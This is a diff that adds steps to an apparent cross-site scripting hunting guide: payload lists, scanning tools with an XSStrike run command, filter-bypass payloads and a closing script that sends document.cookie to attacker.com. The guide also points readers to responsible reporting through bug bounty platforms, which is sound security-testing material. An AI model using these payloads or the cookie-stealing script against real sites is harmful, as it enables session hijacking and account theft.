@@ -111,3 +111,60 @@ Check if the website uses functions like innerHTML, document.write(), or eval().
 
 
 
+📌 Step 5: Use XSS Payloads Lists
+Use pre-built XSS payload lists to try various injections.
+🔗 Payloads All The Things (GitHub):
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+📌 Step 6: Use XSS Hunting Tools
+🧰 1. Burp Suite (Most Popular)
+Intercept requests and modify user input to inject XSS payloads.
+Use Burp Scanner to automate XSS checks.
+🧰 2. OWASP ZAP (Free and Open Source)
+Automated scanner for finding XSS and other vulnerabilities.
+🧰 3. XSStrike
+A dedicated XSS tool that intelligently finds and exploits XSS vulnerabilities.
+bash
+Copy code
+git clone https://github.com/s0md3v/XSStrike
+python3 xsstrike.py -u https://example.com
+🧰 4. XSS Hunter (Advanced)
+Use XSS Hunter to find blind XSS vulnerabilities.
+It provides a custom tracking domain to catch XSS that doesn't show immediate output.
+📌 Step 7: Bypass Filters (WAF/Firewalls)
+Some websites may block basic payloads. Try bypass techniques:
+
+Bypass Tags:
+
+html
+Copy code
+<<script>alert('XSS');</script>
+Using Unicode Encoding:
+
+html
+Copy code
+<scrİpt>alert('XSS')</scrİpt>
+Using Obfuscation:
+
+html
+Copy code
+<img src=x onerror='javasc'+'ript:alert("XSS")'>
+Using Event Handlers:
+
+html
+Copy code
+<input type="text" onfocus="alert('XSS')">
+📌 Step 8: Report XSS Vulnerabilities
+If you find an XSS vulnerability, report it responsibly to the website owner or use bug bounty platforms like:
+
+HackerOne (https://hackerone.com)
+Bugcrowd (https://bugcrowd.com)
+Intigriti (https://www.intigriti.com)
+🚩 Signs of a Successful XSS:
+You see an alert box.
+You can steal cookies using:
+javascript
+Copy code
+<script>
+    fetch('https://attacker.com/steal?cookie=' + document.cookie);
+</script>
